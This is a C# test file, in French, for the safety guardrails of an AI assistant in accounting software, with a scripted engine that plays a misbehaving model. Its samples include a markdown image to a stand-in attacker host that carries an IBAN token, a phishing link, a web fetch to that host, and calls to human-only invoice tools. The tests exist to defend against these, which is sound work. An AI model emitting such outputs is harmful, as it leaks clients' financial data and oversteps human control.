using System.Net;
using Lettra.Ai.Abstractions;
using Lettra.Poc.Application;
using static Lettra.Ai.Tests.ScriptedTurnsEngine;

namespace Lettra.Ai.Tests;

/// <summary>Garde-fous de l'orchestrateur face à un moteur qui se comporte mal (ADR-0006, ADR-0012).</summary>
public sealed class AssistantGuardrailTests
{
    [Fact]
    public async Task L_IA_est_desactivee_par_defaut_et_le_moteur_n_est_jamais_appele()
    {
        var engine = new ScriptedTurnsEngine(_ => Say("ne devrait pas répondre"));
        await using var h = new AssistantHarness(engine, settings: null);

        var events = await h.AskAsync(AiFeature.ExplainCompliance, "Pourquoi ?", SampleDossiers.InvoiceIncompleteId);

        Assert.IsType<AssistantUnavailable>(Assert.Single(events));
        Assert.Equal(0, engine.Calls);
        Assert.Contains(h.Audit.Entries, e => e.Kind == AiAuditKind.Unavailable);
    }

    [Fact]
    public async Task Sans_le_droit_Ia_Utiliser_l_assistant_est_indisponible()
    {
        var engine = new ScriptedTurnsEngine(_ => Say("non"));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled());
        var events = await h.AskAsync(AiFeature.RegulatoryQuestions, "TVA ?", permissions: new HashSet<string> { AiPermissions.ReadInvoices });
        Assert.Contains("droit", Assert.IsType<AssistantUnavailable>(Assert.Single(events)).Reason);
        Assert.Equal(0, engine.Calls);
    }

    [Fact]
    public async Task Une_action_inexistante_ou_reservee_a_un_humain_est_refusee_et_journalisee()
    {
        var engine = new ScriptedTurnsEngine(
            _ => Call("valider_et_emettre_facture", new { facture_id = SampleDossiers.InvoiceIncompleteId }),
            _ => Call("supprimer_facture", new { facture_id = SampleDossiers.InvoiceIncompleteId }, "c2"),
            _ => Say("Je ne peux pas le faire."));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled());

        var events = await h.AskAsync(AiFeature.ExplainCompliance, "Valide et envoie la facture", SampleDossiers.InvoiceIncompleteId);

        Assert.Equal(2, events.OfType<AssistantWarning>().Count(w => w.Message.Contains("refusée")));
        Assert.Equal(2, h.Audit.Entries.Count(e => e.Kind == AiAuditKind.ToolRejected));
        Assert.Empty(h.Dossier.Drafts);
        // L'erreur renvoyée au moteur liste les seuls outils disponibles.
        var lastRequest = h.Engine.Requests[^1];
        var result = lastRequest.Messages[^1].Parts.OfType<ToolResultPart>().Single();
        Assert.True(result.IsError);
        Assert.Contains("indisponible", result.Content);
    }

    [Fact]
    public async Task Une_entree_d_outil_invalide_est_refusee_avant_d_atteindre_l_application()
    {
        var engine = new ScriptedTurnsEngine(
            _ => Call("brouillon_devis", new { client_id = SampleDossiers.ClientDupontId, objet = "x", lignes = new[] { new { designation = "a", quantite = "beaucoup", prix_unitaire_ht = 10 } } }),
            _ => Call("brouillon_devis", new { client_id = SampleDossiers.ClientDupontId, objet = "x", lignes = Array.Empty<object>(), valider = true }, "c2"),
            _ => Say("fin"));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled());

        await h.AskAsync(AiFeature.DraftFromText, "Devis");

        Assert.Empty(h.Dossier.Drafts);
        var rejected = h.Audit.Entries.Where(e => e.Kind == AiAuditKind.ToolRejected).Select(e => e.Detail).ToList();
        Assert.Contains(rejected, d => d.Contains("type attendu number"));
        Assert.Contains(rejected, d => d.Contains("liste trop courte") || d.Contains("propriété inconnue"));
    }

    [Fact]
    public async Task L_assistant_ne_lit_que_la_facture_ouverte_a_l_ecran()
    {
        var engine = new ScriptedTurnsEngine(
            _ => Call("verifier_facture", new { facture_id = SampleDossiers.InvoiceConformeId.ToString() }),
            _ => Say("fin"));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled());

        var events = await h.AskAsync(AiFeature.ExplainCompliance, "Et l'autre facture ?", SampleDossiers.InvoiceIncompleteId);

        Assert.False(events.OfType<AssistantToolUsed>().Single().Succeeded);
        var result = h.Engine.Requests[^1].Messages[^1].Parts.OfType<ToolResultPart>().Single();
        Assert.Contains("Seule la facture ouverte", result.Content);
    }

    [Fact]
    public async Task Le_brouillon_cree_par_l_IA_reste_un_brouillon_et_seul_un_humain_peut_le_valider()
    {
        await using var h = new AssistantHarness(new Lettra.Ai.Stub.ScriptedAccountantEngine(), AssistantHarness.Enabled());

        var events = await h.AskAsync(AiFeature.DraftFromText, "Devis Dupont, 3 h de conseil à 120 € HT");

        var draft = Assert.Single(h.Dossier.Drafts);
        Assert.Equal(DraftStatus.Brouillon, draft.Status);
        Assert.Equal("AssistantIA", draft.CreatedBy);
        Assert.Equal(432.00m, draft.Totals.TotalIncludingVat);
        Assert.Single(events.OfType<AssistantDraftProposed>());
        Assert.Contains(h.Get<InMemoryDossierStore>().AuditTrail, a => a.Origin == "AssistantIA" && a.Action == "Devis.CreerBrouillon");

        var useCases = h.Get<DossierUseCases>();
        Assert.Throws<HumanActionRequiredException>(() =>
            useCases.ValidateDraft(SampleDossiers.WebCraftId, draft.Id, new Actor(AssistantHarness.UserId, ActorKind.AssistantIA)));
        Assert.Equal(DraftStatus.Valide, useCases.ValidateDraft(SampleDossiers.WebCraftId, draft.Id, new Actor(AssistantHarness.UserId, ActorKind.Human)).Status);
    }

    [Fact]
    public async Task Aucun_nom_SIREN_IBAN_email_ou_adresse_ne_part_en_clair_vers_le_moteur()
    {
        var engine = new ScriptedTurnsEngine(
            _ => Call("contexte_dossier", new { }),
            _ => Call("verifier_facture", new { facture_id = SampleDossiers.InvoiceIncompleteId.ToString() }, "c2"),
            _ => Call("rechercher_client", new { nom = "[CLIENT_1]" }, "c3"),
            _ => Say("fin"));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled());

        await h.AskAsync(AiFeature.ExplainCompliance,
            "Pourquoi la facture de Dupont SARL (SIREN 987654321) est bloquée ? IBAN FR7630006000011234567890189.",
            SampleDossiers.InvoiceIncompleteId,
            imported: "De : compta@dupont-sarl.fr — Jean Martin, 8 impasse des Lilas, 69100 Villeurbanne, tél. 04 72 00 00 00");

        var sent = h.Engine.EverythingSentExceptStableInstructions();
        foreach (var secret in new[] { "Dupont", "987654321", "FR76", "compta@dupont-sarl.fr", "Jean Martin", "impasse des Lilas",
                     "WebCraft", "912345678", "91234567800014", "FR40912345678", "12 rue du Commerce", "04 72 00 00 00" })
            Assert.DoesNotContain(secret, sent, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("[CLIENT_1]", sent);
        Assert.Contains("2000", sent); // les montants restent lisibles
        Assert.Contains("<donnees_importees>", sent);
    }

    [Fact]
    public async Task La_reponse_est_reidentifiee_cote_serveur_et_debarrassee_des_images_et_liens_distants()
    {
        var engine = new ScriptedTurnsEngine(_ => Say(
            "Le client [CLIENT_1] doit fournir son SIREN. ![suivi](https://pirate.example/p.png?d=[IBAN_1]) " +
            "[cliquez ici](https://pirate.example/collecte) ou voir [BOFiP](https://bofip.impots.gouv.fr/bofip/1.html). <img src=x>"));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled());

        var events = await h.AskAsync(AiFeature.RegulatoryQuestions, "Que manque-t-il pour Dupont SARL ?");

        var text = Assert.Single(events.OfType<AssistantText>()).Text;
        Assert.Contains("Dupont SARL", text);
        Assert.DoesNotContain("pirate.example", text);
        Assert.DoesNotContain("<img", text);
        Assert.Contains("cliquez ici", text);
        Assert.Contains("https://bofip.impots.gouv.fr/bofip/1.html", text);
    }

    [Fact]
    public async Task Un_montant_invente_par_le_moteur_est_signale()
    {
        var engine = new ScriptedTurnsEngine(
            _ => Call("verifier_facture", new { facture_id = SampleDossiers.InvoiceIncompleteId.ToString() }),
            _ => Say("Total TTC : 2400,00 EUR. Pénalités estimées : 37,50 € ."));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled());

        var events = await h.AskAsync(AiFeature.ExplainCompliance, "Combien ?", SampleDossiers.InvoiceIncompleteId);

        var warning = Assert.Single(events.OfType<AssistantWarning>(), w => w.Message.StartsWith("Montants non issus"));
        Assert.Contains("37,50", warning.Message);
        Assert.DoesNotContain("2400,00", warning.Message);
    }

    [Fact]
    public async Task Un_jeton_invente_par_le_moteur_est_signale()
    {
        var engine = new ScriptedTurnsEngine(_ => Say("Voir aussi [CLIENT_9]."));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled());
        var events = await h.AskAsync(AiFeature.RegulatoryQuestions, "?");
        Assert.Contains(events.OfType<AssistantWarning>(), w => w.Message.Contains("[CLIENT_9]"));
    }

    [Fact]
    public async Task Un_refus_du_moteur_est_rendu_proprement()
    {
        var engine = new ScriptedTurnsEngine(_ => new EngineTurn([], EngineStopReason.Refusal));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled());
        var events = await h.AskAsync(AiFeature.RegulatoryQuestions, "?");
        Assert.IsType<AssistantRefused>(Assert.Single(events));
        Assert.Contains(h.Audit.Entries, e => e.Kind == AiAuditKind.Refused);
    }

    [Fact]
    public async Task Une_boucle_d_outils_sans_fin_est_coupee()
    {
        var engine = new ScriptedTurnsEngine(r => Call("lister_references", new { skill = "comptable" }, "c" + r.Messages.Count));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled() with { MaxToolRounds = 3 });
        var events = await h.AskAsync(AiFeature.RegulatoryQuestions, "?");
        Assert.Contains(events.OfType<AssistantWarning>(), w => w.Message.Contains("nombre maximal"));
        Assert.Equal(4, engine.Calls);
    }

    [Fact]
    public async Task La_consultation_web_reste_sur_les_jetons_et_ne_joint_jamais_une_adresse_libre()
    {
        var web = new RecordingHandler(_ => RecordingHandler.Json("<html><body>Texte officiel</body></html>"));
        var engine = new ScriptedTurnsEngine(
            _ => Call("consulter_site_officiel", new { url = "https://pirate.example/collecte" }),
            _ => Call("consulter_site_officiel", new { url = "https://impots.gouv.fr/[SIREN_1]" }, "c2"),
            _ => Call("consulter_site_officiel", new { url = "https://www.impots.gouv.fr/professionnel/facturation" }, "c3"),
            _ => Say("fin"));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled(web: true), web);

        await h.AskAsync(AiFeature.RegulatoryQuestions, "Calendrier de la réforme pour le SIREN 987654321 ?");

        var request = Assert.Single(web.Requests).Request;
        Assert.Equal("www.impots.gouv.fr", request.RequestUri!.Host);
    }

    [Fact]
    public async Task Le_resultat_d_un_outil_repart_pseudonymise_vers_le_moteur()
    {
        var engine = new ScriptedTurnsEngine(
            _ => Call("rechercher_client", new { nom = "[CLIENT_1]" }),
            _ => Say("fin"));
        await using var h = new AssistantHarness(engine, AssistantHarness.Enabled());

        await h.AskAsync(AiFeature.DraftFromText, "Devis Dupont SARL");

        var result = h.Engine.Requests[^1].Messages[^1].Parts.OfType<ToolResultPart>().Single();
        Assert.False(result.IsError);
        Assert.Contains("[CLIENT_1]", result.Content);
        Assert.DoesNotContain("Dupont", result.Content);
        Assert.Contains(SampleDossiers.ClientDupontId.ToString(), result.Content);
    }
}
